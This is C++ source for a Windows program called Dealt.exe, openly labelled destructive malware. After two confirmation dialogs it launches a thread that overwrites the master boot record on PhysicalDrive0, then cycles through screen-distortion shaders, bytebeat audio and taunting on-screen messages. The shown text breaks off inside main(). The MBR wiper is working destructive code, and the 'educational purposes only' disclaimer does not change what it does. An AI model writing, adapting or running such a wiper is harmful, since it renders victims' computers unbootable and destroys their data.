// Dealt.exe.exe by VietNamLover.
// This is a destructive malware. DO NOT RUN on real PC.
// Educational purposes only.

#include <Windows.h>
#include <stdio.h>
#include <algorithm>
#include <math.h>
#include <time.h>

#pragma comment(lib, "winmm.lib")

#ifndef M_PI
#define M_PI 3.14159265358979323846264338327950288
#endif

using std::min;
using std::max;

// ==================== CUSTOM MBR DATA ===================="
unsigned char MasterBootRecord[512] = {
    0x56, 0x49, 0x45, 0x54, 0x4E, 0x41, 0x4D, 0x4C, 0x4F, 0x56, 0x45, 0x52, 0x20, 0x57, 0x41, 0x53,
    0x20, 0x48, 0x45, 0x52, 0x45, 0x20, 0x2D, 0x20, 0x44, 0x45, 0x4C, 0x54, 0x41, 0x2E, 0x45, 0x58,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

// ==================== MBR WIPER ====================
DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}

// ==================== COLOR CONVERSION (Credit: Wipet) ====================
namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed, g = rgb.rgbGreen, b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT h = 0.f, s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : 
                          (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            FLOAT deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            FLOAT deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            FLOAT deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f) h += 1.f;
            if (h > 1.f) h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }
    
    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l, g = hsl.l, b = hsl.l;
        FLOAT h = hsl.h, sl = hsl.s, l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        
        if (v > 0.f) {
            FLOAT m = l + l - v;
            FLOAT sv = (v - m) / v;
            h *= 6.f;
            INT sextant = (INT)h;
            FLOAT fract = h - sextant;
            FLOAT vsf = v * sv * fract;
            FLOAT mid1 = m + vsf;
            FLOAT mid2 = v - vsf;
            
            switch (sextant) {
                case 0: r = v; g = mid1; b = m; break;
                case 1: r = mid2; g = v; b = m; break;
                case 2: r = m; g = v; b = mid1; break;
                case 3: r = m; g = mid2; b = v; break;
                case 4: r = mid1; g = m; b = v; break;
                case 5: r = v; g = m; b = mid2; break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

// ==================== SHADER 1: XOR RAINBOW ====================
DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) ^ (y * i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ==================== SHADER 2: PLASMA EFFECT ====================
DWORD WINAPI shader2(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int j = 4 * i;
                int fx = (int)(j + (j * sin(x / 16.0)) + 
                               j + (j * sin(y / 8.0)) + 
                               j + (j * sin((x + y) / 16.0)) + 
                               j + (j * sin(sqrt((double)(x * x + y * y)) / 8.0))) / 4;
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ==================== SHADER 3: STATIC COLOR SHIFT ====================
DWORD WINAPI shader3(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = 239 + i;
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ==================== PAYLOAD 4: SCREEN INVERT PULSE ====================
DWORD WINAPI payload4(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        StretchBlt(hdc, -20, -20, sw + 40, sh + 40, hdc, 0, 0, sw, sh, SRCINVERT);
        ReleaseDC(0, hdc);
        Sleep(4);
    }
}

// ==================== PAYLOAD: RANDOM PIE SHAPES ====================
DWORD WINAPI elipse(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, 
                 rand() % x, rand() % y, rand() % x, rand() % y);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

// ==================== SHADER 4: NEGATIVE XOR ====================
DWORD WINAPI shader4(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x - i) ^ (y - i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ==================== PAYLOAD: PATTERN SHAKE ====================
DWORD WINAPI patshake(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 225, rand() % 225, rand() % 225));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
    }
}

// ==================== SHADER 5: ADDITIVE XOR ====================
DWORD WINAPI shader5(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) ^ (y + i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ==================== SHADER 6: MULTIPLICATIVE XOR ====================
DWORD WINAPI shader6(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) * (y + i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ==================== SHADER 7: TUNNEL EFFECT ====================
DWORD WINAPI shader7(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    int n = 10;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = 239 + i;
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, n, n, w - n * 2, h - n * 2, hdcCopy, 0, 0, w, h, SRCCOPY);
        if (n < w) n += 12;
        if (n > w) n = 4;
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

// ==================== PAYLOAD: MELTING SCREEN ====================
DWORD WINAPI last(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        hdc = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sin(angle) * 360;
            BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
            angle += M_PI / 3;
        }
        ReleaseDC(GetDesktopWindow(), hdc);
    }
}

// ==================== PAYLOAD 15: GLITCH HORIZONTAL ====================
DWORD WINAPI glitchH(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        for (int i = 0; i < 20; i++) {
            int y = rand() % h;
            int height = rand() % 30 + 5;
            int offset = rand() % 50 - 25;
            BitBlt(hdc, offset, y, w, height, hdc, 0, y, SRCCOPY);
        }
        ReleaseDC(0, hdc);
        Sleep(50);
    }
}

// ==================== PAYLOAD 16: PIXEL RAIN ====================
DWORD WINAPI pixelRain(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        for (int i = 0; i < 100; i++) {
            int x = rand() % w;
            int y = rand() % h;
            SetPixel(hdc, x, y, RGB(rand() % 255, rand() % 255, rand() % 255));
        }
        BitBlt(hdc, 0, 1, w, h - 1, hdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(20);
    }
}

// ==================== PAYLOAD 17: SCREEN SPIN ====================
DWORD WINAPI screenSpin(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        static float angle = 0;
        int cx = w / 2, cy = h / 2;
        for (int x = 0; x < w; x += 50) {
            for (int y = 0; y < h; y += 50) {
                int newX = cx + (x - cx) * cos(angle) - (y - cy) * sin(angle);
                int newY = cy + (x - cx) * sin(angle) + (y - cy) * cos(angle);
                BitBlt(hdc, newX, newY, 50, 50, hdc, x, y, SRCCOPY);
            }
        }
        angle += 0.05f;
        ReleaseDC(0, hdc);
        Sleep(30);
    }
}

// ==================== PAYLOAD 18: GLASS BREAK ====================
DWORD WINAPI glassBreak(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        for (int i = 0; i < 30; i++) {
            int srcX = rand() % w;
            int srcY = rand() % h;
            int dstX = rand() % w;
            int dstY = rand() % h;
            int width = rand() % 100 + 20;
            int height = rand() % 100 + 20;
            StretchBlt(hdc, dstX, dstY, width, height, hdc, srcX, srcY, width, height, SRCCOPY);
        }
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

// ==================== TEXT SPAM ====================
DWORD WINAPI textouts(LPVOID lpvd) {
    int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
    const char* messages[] = {
        "Dealt.exe by VietNamLover",
        "R.I.P YOUR COMPUTER!",
        "THERE IS NO ESCAPE!",
        "SYSTEM DESTROYED!",
        "THIS IS THE END!",
        "DEALT.EXE WAS HERE",
        "GOODBYE WINDOWS!",
        "HAVE A NICE DAY :)",
        "BSOD INCOMING..."
    };
    
    while (1) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        for (int i = 0; i < 9; i++) {
            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            TextOutA(hdc, rand() % x, rand() % y, messages[i], strlen(messages[i]));
            Sleep(10);
        }
        ReleaseDC(0, hdc);
    }
}

// ==================== BYTEBEATS ====================
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (0x21CA52CA >> (t >> 9 & 30) & 14) + 
                                      t * (0xCACACACA >> (t >> 9 & 30) & 12) & t >> 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 8192 ? 7 : 5) * 
                                      (6 - (3 & t >> 8) + (2 & t >> 9)) >> 
                                      (3 & -t >> (t & 2048 ? 2 : 11)) | t >> 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t / (3 + (t >> 8 & t >> 9)) & 130);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if ((t >> 13 ^ t >> 8) != 0) 
            buffer[t] = static_cast<char>(t * t / (t >> 13 ^ t >> 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 7 | t << 2) + (t >> 3 | t << 3 | t >> 3) | 
                                      t >> 2 | t << 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * -(t >> 9 | t | t >> 8 | t >> 12) ^ t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 60] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + 
                                           (1 & t >> 15)) >> (2 & t >> (t & 2048 ? 3 : 11)) | 
                                      t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 4));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 9 | t >> 10) & 30) & t << 1);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

// ==================== MAIN EXECUTION ====================
int main() {
    if (MessageBoxW(NULL, L"Run Malware?", L"Dealt.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"Are you sure? It will destroy your computer!", 
                    L"Dealt.exe - Last Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    // Start MBR Wiper
    CreateThread(0, 0, MBRWiper, 0, 0, 0);
    Sleep(5000);

    HANDLE t1 = CreateThread(0, 0, shader1, 0, 0, 0);
    sound1(); Sleep(30000);
    TerminateThread(t1, 0); CloseHandle(t1);
    InvalidateRect(0, 0, 0);

    HANDLE t2 = CreateThread(0, 0, shader2, 0, 0, 0);
    sound2(); Sleep(30000);
    TerminateThread(t2, 0); CloseHandle(t2);
    InvalidateRect(0, 0, 0);

    HANDLE t3 = CreateThread(0, 0, shader3, 0, 0, 0);
    sound3(); Sleep(30000);
    TerminateThread(t3, 0); CloseHandle(t3);
    InvalidateRect(0, 0, 0);

    HANDLE t4 = CreateThread(0, 0, payload4, 0, 0, 0);
    HANDLE t4b = CreateThread(0, 0, elipse, 0, 0, 0);
    sound4(); Sleep(30000);
    TerminateThread(t4, 0); CloseHandle(t4);
    TerminateThread(t4b, 0); CloseHandle(t4b);
    InvalidateRect(0, 0, 0);

    HANDLE t5 = CreateThread(0, 0, shader4, 0, 0, 0);
    sound5(); Sleep(30000);
    TerminateThread(t5, 0); CloseHandle(t5);
    InvalidateRect(0, 0, 0);

    HANDLE t6 = CreateThread(0, 0, patshake, 0, 0, 0);
    HANDLE t6b = CreateThread(0, 0, textouts, 0, 0, 0);
    sound6(); Sleep(30000);
    TerminateThread(t6, 0); CloseHandle(t6);
    InvalidateRect(0, 0, 0);

    HANDLE t7 = CreateThread(0, 0, shader5, 0, 0, 0);
    sound7(); Sleep(30000);
    TerminateThread(t7, 0); CloseHandle(t7);
    InvalidateRect(0, 0, 0);

    HANDLE t8 = CreateThread(0, 0, shader6, 0, 0, 0);
    Sleep(30000);
    TerminateThread(t8, 0); CloseHandle(t8);
    InvalidateRect(0, 0, 0);

    HANDLE t9 = CreateThread(0, 0, shader7, 0, 0, 0);
    sound8(); Sleep(30000);
    TerminateThread(t9, 0); CloseHandle(t9);
    InvalidateRect(0, 0, 0);

    HANDLE t10 = CreateThread(0, 0, last, 0, 0, 0);
